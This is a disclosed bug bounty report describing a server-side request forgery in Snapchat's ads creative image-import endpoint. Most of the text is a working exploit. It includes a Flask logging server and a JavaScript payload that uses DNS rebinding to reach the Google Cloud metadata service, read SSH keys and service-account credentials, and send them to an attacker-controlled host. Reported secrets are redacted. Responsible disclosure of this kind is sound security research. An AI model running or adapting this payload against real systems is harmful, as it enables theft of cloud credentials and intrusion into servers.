# Server-Side Request Forgery using Javascript allows to exfill data from Google Metadata

## Report Details
- **Report ID**: 530974
- **URL**: https://hackerone.com/reports/530974
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2019-04-08T05:29:28.539Z
- **Disclosed**: 2020-11-30T18:27:26.494Z

## Reporter
- **Username**: nahamsec
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: snapchat

## Vulnerability Information
Hey there, 
I was looking at your ads site with @daeken, we found some weird behavior in the import function of the creative app. Here are the steps:

#POC
- Login to https://business.snapchat.com/
- Go to creative library -> New Creative 
- Under "Topsnap Media", click on "Create"
- Click on any of the templates and load it
- Click on one of the images in the template -> Replace -> Import
- _This is where the SSRF exists_. Where you fetch images for your creative (`/api/v1/media/import`)
-  Run this somewhere publicly accessible:

```
from flask import Flask, request
from flask_cors import CORS
from time import sleep

app = Flask(__name__)
CORS(app)

import logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

@app.route("/")
def helloWorld():
        sleep(3)
        return 'hi!'

@app.route('/log')
def log():
        print request.args['msg']
        return ''

app.run(host='0.0.0.0')
```

- Put this on another domain you control. Change demon.██████████ to the host where you put this html file, and change ssh.████ to the host you're running the timing script (above) on.

```
<script>
var logTimeServer = 'ssh.█████';
var attackServer = 'demon.██████';

function log(data) {
    var sreq = new XMLHttpRequest();
    sreq.open('GET', 'http://' + logTimeServer + ':5000/log?msg=' + encodeURI(data), true);
    sreq.send();
}

function get(url) {
    try {
        var req = new XMLHttpRequest();
        req.open('GET', url, false);
        req.setRequestHeader('X-Google-Metadata-Request', 'True');
        req.send(null);
        if(req.status == 200)
            return req.responseText;
        else
            return '[failed status=' + req.status + ']';
    } catch(err) {
        log(err);
    }
    return null;
}

log('Triggered in ' + window.location.href);

for(var i = 0; i < 60; ++i) {
    log('Loop ' + i);
    var req = new XMLHttpRequest();
    req.open('GET', 'http://' + logTimeServer + ':5000/', false);
    req.send();
}
log('SSH Keys: ' + get('http://' + attackServer + '/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json'));
log('Service Accounts: ' + get('http://' + attackServer + '/computeMetadata/v1/instance/service-accounts/?recursive=true&alt=json'));
log('Hostname: ' + get('http://' + attackServer + '/computeMetadata/v1/instance/hostname'));
</script>
```

- Now hit `/api/v1/media/import` on `ads.snapchat.com`, with the URL parameter http://demon.███████/ssrf.html (or wherever you run it)
- Immediately after requesting `ssrf.html`, switch the DNS on the domain to point to 169.254.169.254, and wait 3 minutes.  ssrf.html needs to be running on port 80, that way when the DNS changes, it starts talking to the metadata service.

## Impact

#SSH Keys:

```
SSH Keys: "██████"
```

#Hostname: 
`█████████`

## Attachments
No attachments
